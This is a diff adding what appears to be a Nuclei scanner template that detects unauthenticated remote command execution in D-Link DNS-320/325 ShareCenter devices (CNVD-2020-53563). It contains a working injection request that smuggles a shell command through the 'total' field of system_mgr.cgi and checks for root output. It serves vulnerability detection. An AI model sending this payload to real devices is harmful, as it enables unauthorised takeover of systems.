@@ -1,0 +1,29 @@
+id: dlink-dns-sharecenter-rce-cnvd-2020-53563
+info:
+  name: D-Link DNS ShareCenter RCE (CNVD-2020-53563)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    D-Link ShareCenter DNS-320 and DNS-325 allow remote command execution via shell metacharacters in the total field to the system_mgr.cgi. Unauthenticated attackers can control the device through remote command execution.
+  tags: rce
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-53563
+
+variables:
+  cmd: "id"
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;{{cmd}}; HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid=0(root) gid=0(root)"
